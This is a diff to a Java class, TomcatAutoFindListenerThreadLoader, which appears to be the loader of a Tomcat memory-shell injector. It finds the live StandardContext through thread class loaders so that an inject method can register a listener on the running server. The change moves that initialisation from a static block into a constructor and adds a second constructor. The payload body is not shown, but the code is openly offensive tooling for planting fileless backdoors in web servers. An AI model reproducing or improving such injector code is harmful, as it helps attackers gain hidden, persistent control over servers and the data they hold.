@@ -28,9 +28,6 @@ public class TomcatAutoFindListenerThreadLoader {
     private static String CLASSNAME;
 
     public TomcatAutoFindListenerThreadLoader() {
-    }
-
-    static {
         try {
             // 获取 standardContext
             Object standardContext = getTargetObject("org.apache.catalina.core.StandardContext");
@@ -40,6 +37,10 @@ public class TomcatAutoFindListenerThreadLoader {
         } catch (Throwable e) {
 
         }
+    }
+
+    public TomcatAutoFindListenerThreadLoader(Object o) {
+
     }
 
     public static void inject(Object standardContext) throws Exception {
@@ -175,7 +176,7 @@ public class TomcatAutoFindListenerThreadLoader {
     }
 
     public static Object getTargetObject(String className) throws Exception {
-        List<ClassLoader> activeClassLoaders = new TomcatAutoFindListenerThreadLoader().getActiveClassLoaders();
+        List<ClassLoader> activeClassLoaders = new TomcatAutoFindListenerThreadLoader(null).getActiveClassLoaders();
 
         Class cls = getTargetClass(className, activeClassLoaders);
 
